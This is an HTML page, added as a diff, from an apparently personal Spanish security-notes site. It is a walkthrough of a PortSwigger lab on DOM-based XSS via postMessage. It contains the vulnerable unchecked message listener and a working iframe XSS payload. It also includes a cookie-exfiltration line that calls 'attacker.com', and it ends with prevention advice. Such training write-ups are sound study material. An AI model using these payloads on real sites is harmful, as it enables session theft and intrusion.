@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;window.addEventListener(&#39;message&#39;, function(e) {&lt;/code&gt;document.getElementById(‘ads’).innerHTML = e.data;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;})&lt;/code&gt;&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p><code class="language-plaintext highlighter-rouge">window.addEventListener('message', function(e) {
+</code>document.getElementById(‘ads’).innerHTML = e.data;
+<code class="language-plaintext highlighter-rouge">})</code></p>
+
+<p>El código que has compartido añade un <em>event listener</em> al objeto <code class="language-plaintext highlighter-rouge">window</code> para escuchar el evento <code class="language-plaintext highlighter-rouge">'message'</code>. Este evento se dispara cuando se recibe un mensaje desde otra ventana, un <code class="language-plaintext highlighter-rouge">iframe</code>, o un script en otro dominio (usando la API <code class="language-plaintext highlighter-rouge">postMessage</code>).</p>
+
+<h3 id="desglose-del-código">Desglose del código:</h3>
+
+<ol>
+  <li><strong><code class="language-plaintext highlighter-rouge">window.addEventListener('message', function(e) { ... })</code></strong>:
+    <ul>
+      <li>Este fragmento agrega un “escuchador” para el evento <code class="language-plaintext highlighter-rouge">message</code> en el objeto <code class="language-plaintext highlighter-rouge">window</code>.</li>
+      <li>El evento <code class="language-plaintext highlighter-rouge">message</code> se activa cuando un script envía un mensaje al documento utilizando <code class="language-plaintext highlighter-rouge">window.postMessage()</code>.</li>
+    </ul>
+  </li>
+  <li><strong><code class="language-plaintext highlighter-rouge">function(e) { ... }</code></strong>:
+    <ul>
+      <li>Es una función anónima que se ejecuta cada vez que se recibe un mensaje. El parámetro <code class="language-plaintext highlighter-rouge">e</code> es el objeto del evento, que contiene datos relevantes sobre el mensaje recibido.</li>
+    </ul>
+  </li>
+  <li><strong><code class="language-plaintext highlighter-rouge">document.getElementById('ads').innerHTML = e.data;</code></strong>:
+    <ul>
+      <li>Este código actualiza el contenido HTML del elemento con el ID <code class="language-plaintext highlighter-rouge">'ads'</code> en el documento.</li>
+      <li>La propiedad <code class="language-plaintext highlighter-rouge">e.data</code> contiene los datos enviados por el remitente del mensaje. Estos datos se insertan directamente en el HTML del elemento.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>==El siguiente código envía un post message, como la página está escuchando lo incrustará en ads sin sanitización y si  filtrado de urls origen==</p>
+
+<p>`&lt;iframe src="https://0aac00e603759fe580288a3400c1008f.web-security-academy.net/" onload="this.contentWindow.postMessage('&lt;img src=1 onerror=print()&gt;','*')"&gt;</p>
+
+<p>El código que has compartido intenta explotar una vulnerabilidad de tipo Cross-Site Scripting (XSS) utilizando un iframe que carga una URL externa y envía un mensaje malicioso mediante la API <code class="language-plaintext highlighter-rouge">postMessage</code>. Aquí está el desglose de lo que está haciendo:</p>
+
+<h3 id="explicación-del-código">Explicación del Código:</h3>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://0aac00e603759fe580288a3400c1008f.web-security-academy.net/"</span> 
+        <span class="na">onload=</span><span class="s">"this.contentWindow.postMessage('&lt;img src=1 onerror=print()&gt;','*')"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<ol>
+  <li><strong><code class="language-plaintext highlighter-rouge">&lt;iframe src="..."&gt;</code></strong>:
+    <ul>
+      <li>Crea un iframe que carga la URL <code class="language-plaintext highlighter-rouge">https://0aac00e603759fe580288a3400c1008f.web-security-academy.net/</code>. Un iframe permite incrustar otra página web dentro de la actual.</li>
+    </ul>
+  </li>
+  <li><strong><code class="language-plaintext highlighter-rouge">onload="this.contentWindow.postMessage(...)"</code></strong>:
+    <ul>
+      <li>El atributo <code class="language-plaintext highlighter-rouge">onload</code> se activa cuando el contenido del iframe ha terminado de cargarse.</li>
+      <li><code class="language-plaintext highlighter-rouge">this.contentWindow</code> se refiere al objeto <code class="language-plaintext highlighter-rouge">window</code> de la página cargada dentro del iframe.</li>
+      <li><code class="language-plaintext highlighter-rouge">postMessage('&lt;img src=1 onerror=print()&gt;', '*')</code> envía un mensaje al contenido del iframe. Este mensaje contiene un payload malicioso: <code class="language-plaintext highlighter-rouge">'&lt;img src=1 onerror=print()&gt;'</code>.</li>
+    </ul>
+  </li>
+  <li><strong>El Payload</strong>:
+    <ul>
+      <li>El payload <code class="language-plaintext highlighter-rouge">'&lt;img src=1 onerror=print()&gt;'</code> es un intento de inyectar código JavaScript que se ejecutará cuando ocurra un error en la carga de la imagen (porque la URL <code class="language-plaintext highlighter-rouge">src=1</code> no es válida).</li>
+      <li><code class="language-plaintext highlighter-rouge">onerror=print()</code> es el código que se ejecuta cuando falla la carga de la imagen. <code class="language-plaintext highlighter-rouge">print()</code> es una función que en algunos navegadores puede abrir el cuadro de diálogo de impresión, pero en un escenario real, este atributo podría ser reemplazado por cualquier código malicioso, como <code class="language-plaintext highlighter-rouge">alert(document.cookie)</code> o <code class="language-plaintext highlighter-rouge">fetch('http://attacker.com/?data='+document.cookie)</code> para exfiltrar cookies.</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="condiciones-para-la-explotación">Condiciones para la Explotación:</h3>
+
+<ul>
+  <li>
+    <p><strong>Aceptación del Mensaje</strong>: La página cargada dentro del iframe debe tener un <code class="language-plaintext highlighter-rouge">message</code> event listener que acepte y procese el mensaje sin validar correctamente el contenido. Esto significa que, en su código JavaScript, debe haber algo similar a <code class="language-plaintext highlighter-rouge">window.addEventListener('message', function(e) { document.body.innerHTML = e.data; });</code>, que inserta directamente el contenido del mensaje en el DOM.</p>
+  </li>
+  <li>
+    <p><strong>Permitir ejecución de código</strong>: Si la página inserta el contenido del mensaje en el DOM sin sanitización, entonces se ejecutará el código malicioso (<code class="language-plaintext highlighter-rouge">onerror=print()</code> en este caso).</p>
+  </li>
+</ul>
+
+<h3 id="riesgos">Riesgos:</h3>
+
+<p>Si el sitio vulnerable no valida correctamente los mensajes que recibe a través de <code class="language-plaintext highlighter-rouge">postMessage</code>, este código podría resultar en la ejecución de scripts arbitrarios, lo que llevaría a un ataque de Cross-Site Scripting (XSS).</p>
+
+<h3 id="prevención">Prevención:</h3>
+
+<ul>
+  <li>
+    <p><strong>Sanitización y validación</strong>: La página dentro del iframe debe asegurarse de validar y sanitizar cualquier mensaje recibido a través de <code class="language-plaintext highlighter-rouge">postMessage</code> para prevenir la inyección de código malicioso.</p>
+  </li>
+  <li>
+    <p><strong>Uso seguro de <code class="language-plaintext highlighter-rouge">postMessage</code></strong>: Limitar el origen de los mensajes a dominios de confianza utilizando <code class="language-plaintext highlighter-rouge">e.origin</code> en lugar de aceptar mensajes de cualquier origen (<code class="language-plaintext highlighter-rouge">'*'</code>).</p>
+  </li>
+</ul>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
